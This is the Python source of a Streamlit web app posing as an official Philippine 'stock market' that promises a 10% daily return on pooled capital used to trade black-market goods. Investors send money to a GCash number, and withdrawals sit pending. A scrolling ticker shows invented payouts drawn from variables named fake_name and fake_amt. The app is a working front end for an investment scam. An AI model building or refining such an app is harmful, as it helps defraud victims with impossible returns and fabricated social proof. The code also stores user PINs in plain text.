import streamlit as st
import json
import os
from datetime import datetime, timedelta
import time
import random

# --- 1. CORE DATA ---
REGISTRY_FILE = "bpsm_registry.json"

def load_registry():
    if os.path.exists(REGISTRY_FILE):
        try:
            with open(REGISTRY_FILE, "r") as f:
                return json.load(f)
        except: return {}
    return {}

def update_user(name, data):
    reg = load_registry()
    reg[name] = data
    with open(REGISTRY_FILE, "w") as f:
        json.dump(reg, f, default=str)

# --- 2. THE PREMIUM MOBILE DESIGN ---
st.set_page_config(page_title="BPSM Official", layout="wide")

st.markdown("""
    <style>
    [data-testid="stSidebar"] { display: none; }
    header { visibility: hidden; }
    .stApp { background-color: #0b0c0e; color: white; }
    .block-container { padding: 0 !important; max-width: 100% !important; }

    /* HIGH-IMPACT AD BANNER */
    .banner {
        background: linear-gradient(135deg, #0038a8 0%, #ce1126 100%);
        padding: 40px 20px; text-align: center; border-bottom: 5px solid #0dcf70;
    }
    .banner h1 { font-family: 'Arial Black'; font-size: 2.2rem; color: white; margin: 0; line-height: 1.1; text-shadow: 2px 2px #000; }
    .banner h3 { color: #0dcf70; font-size: 1rem; margin-top: 10px; text-transform: uppercase; letter-spacing: 2px; }
    .banner p { font-size: 0.9rem; color: #ffffff; margin-top: 15px; font-weight: 500; line-height: 1.5; text-align: center; padding: 0 10px; }

    /* BALANCE DASHBOARD */
    .user-box { text-align: center; padding: 30px 10px; background: #111217; }
    .balance-label { color: #8c8f99; font-size: 0.8rem; letter-spacing: 2px; }
    .balance-val { color: #0dcf70; font-size: 3.2rem; font-weight: 900; margin: 5px 0; }

    /* NAVIGATION BUTTONS */
    .stButton>button {
        width: 100% !important; border-radius: 12px !important; height: 4.2rem !important;
        background: #1c1e24 !important; color: #ffffff !important;
        border: 1px solid #3a3d46 !important; font-weight: bold !important; font-size: 1rem !important;
    }
    
    /* THE GREEN DEPLOY BUTTON */
    div[data-testid="stButton"] > button:contains("DEPLOY") {
        background: #0dcf70 !important; color: #0b0c0e !important;
        font-size: 1.3rem !important; font-weight: 900 !important; border: none !important;
    }

    /* TIMER CARD */
    .timer-card {
        background: #1c1e24; padding: 20px; border-radius: 20px;
        border: 1px solid #2a2b30; margin: 15px; text-align: center;
    }
    .timer-val { color: #0dcf70; font-family: monospace; font-size: 2.2rem; font-weight: bold; }

    /* LIVE TICKER */
    .ticker-wrap {
        background: #000; color: #0dcf70; padding: 10px 0;
        position: fixed; bottom: 0; width: 100%; font-size: 0.8rem;
        border-top: 1px solid #2a2b30; font-weight: bold; overflow: hidden;
    }

    /* INPUT STYLING */
    .stNumberInput input, .stTextInput input {
        color: #000000 !important; -webkit-text-fill-color: #000000 !important;
        background-color: #ffffff !important; border-radius: 10px !important; 
        height: 3.8rem !important; font-size: 18px !important; font-weight: bold !important;
    }
    </style>
    """, unsafe_allow_html=True)

# --- 3. LOGIN & ADVERTISING ---
if 'user' not in st.session_state: st.session_state.user = None
if 'page' not in st.session_state: st.session_state.page = "main"

if st.session_state.user is None:
    st.markdown("""<div class="banner">
        <h1>BAGONG PILIPINAS<br>STOCK MARKET</h1>
        <h3>Official Liquidity Provider</h3>
        <p><b>THE SYSTEM:</b> We acquire Black Market commodities (Rice, Fuel, Semi-conductors) in massive bulk volume using pooled capital. These goods are flipped to verified retailers within 18 hours.
        <br><br><b>YOUR PROFIT:</b> You provide the capital liquidity; we provide the 10% daily ROI. Secure. Fast. Continuous.</p>
    </div>""", unsafe_allow_html=True)
    
    t1, t2 = st.tabs(["🔑 SIGN-IN", "📝 REGISTER"])
    with t1:
        ln = st.text_input("INVESTOR NAME", key="l_name").upper()
        lp = st.text_input("6-DIGIT PIN", type="password", max_chars=6, key="l_pin")
        if st.button("VERIFY & ACCESS PORTAL"):
            reg = load_registry()
            if ln in reg and reg[ln]['pin'] == lp:
                st.session_state.user = ln
                st.rerun()
            else: st.error("Access Denied.")
    with t2:
        rn = st.text_input("FULL NAME", key="r_name").upper()
        rp = st.text_input("CREATE PIN", type="password", max_chars=6, key="r_pin")
        if st.button("CREATE ACCOUNT"):
            if rn and len(rp) == 6:
                if update_user(rn, {"pin": rp, "wallet": 0.0, "inv": [], "tx": []}) is None:
                    st.success("Registration Successful!")

# --- 4. INVESTOR PORTAL ---
else:
    name = st.session_state.user
    reg = load_registry()
    data = reg[name]
    now = datetime.now()

    # Automatic Profit Payout
    active_inv = []
    payout = 0
    for i in data.get('inv', []):
        if now >= datetime.fromisoformat(i['end']): payout += (i['amt'] + i['prof'])
        else: active_inv.append(i)
    if payout > 0:
        data['wallet'] += payout
        data['inv'] = active_inv
        update_user(name, data)

    # HEADER
    st.markdown(f"<div class='user-box'><p class='balance-label'>AVAILABLE ASSETS</p><h1 class='balance-val'>₱{data['wallet']:,.2f}</h1><p style='color:#8c8f99;'>Account: {name}</p></div>", unsafe_allow_html=True)

    # NAVIGATION
    c1, c2 = st.columns(2)
    if c1.button("📥 DEPOSIT"): st.session_state.page = "dep"
    if c2.button("📤 WITHDRAW"): st.session_state.page = "wd"
    if st.button("📊 VIEW TRADING FLOOR"): st.session_state.page = "main"

    if st.session_state.page == "dep":
        st.info("Official GCash: 0912-345-6789")
        d_amt = st.number_input("Amount Sent", min_value=100.0)
        ref = st.text_input("Ref Number")
        if st.button("SUBMIT REPORT"):
            data.setdefault('tx', []).append({"date": now.strftime("%H:%M"), "type": "DEP", "amt": d_amt, "status": "PENDING"})
            update_user(name, data)
            st.success("Admin notified.")
    
    elif st.session_state.page == "wd":
        w_amt = st.number_input("Amount to Cash-out", min_value=100.0)
        if st.button("REQUEST PAYOUT"):
            if data['wallet'] >= w_amt:
                data['wallet'] -= w_amt
                data.setdefault('tx', []).append({"date": now.strftime("%H:%M"), "type": "WD", "amt": w_amt, "status": "PENDING"})
                update_user(name, data)
                st.warning("Requesting...")
            else: st.error("Insufficient Balance.")

    else:
        tab_t, tab_a, tab_l = st.tabs(["🚀 DEPLOY", "⏳ ACTIVE", "📜 LOGS"])
        with tab_t:
            st.write("### New Capital Deployment")
            inv_a = st.number_input("Enter Amount (PHP)", min_value=100.0, step=100.0)
            if st.button("CONFIRM & DEPLOY CAPITAL"):
                if data['wallet'] >= inv_a:
                    data['wallet'] -= inv_a
                    data.setdefault('inv', []).append({"amt": inv_a, "prof": inv_a*0.1, "end": (now + timedelta(hours=24)).isoformat()})
                    update_user(name, data)
                    st.rerun()
                else: st.error("Low Balance.")
        with tab_a:
            if not active_inv: st.write("No active capital.")
            for t in active_inv:
                rem = datetime.fromisoformat(t['end']) - now
                st.markdown(f"""<div class="timer-card"><p style="color:#8c8f99; margin:0;">CAPITAL: ₱{t['amt']:,} (+10%)</p>
                <p style="margin:5px 0;">LIQUIDATING IN:</p><div class="timer-val">{str(rem).split(".")[0]}</div></div>""", unsafe_allow_html=True)
        with tab_l:
            for t in reversed(data.get('tx', [])):
                st.write(f"**{t['type']}** | ₱{t['amt']:,} | {t['status']}")

    # --- LIVE GLOBAL TICKER ---
    names = ["Juan D.", "Maria S.", "Rico P.", "Liza M.", "Kiko V.", "Bong G."]
    fake_name = random.choice(names)
    fake_amt = random.randint(500, 5000)
    st.markdown(f"""
        <div class="ticker-wrap">
            <marquee>🔥 LIVE PAYOUT: {fake_name} just received ₱{fake_amt:,} profit! &nbsp;&nbsp;&nbsp; 🚀 NEW TRADE: User 'Admin' deployed ₱10,000.00 into Fuel Commodities... &nbsp;&nbsp;&nbsp; ✅ WITHDRAWAL: {random.choice(names)} cashed out ₱{random.randint(1000, 2000):,} successfully!</marquee>
        </div>
    """, unsafe_allow_html=True)

    if st.sidebar.button("LOGOUT"):
        st.session_state.user = None
        st.rerun()

    time.sleep(2)
    st.rerun()
    
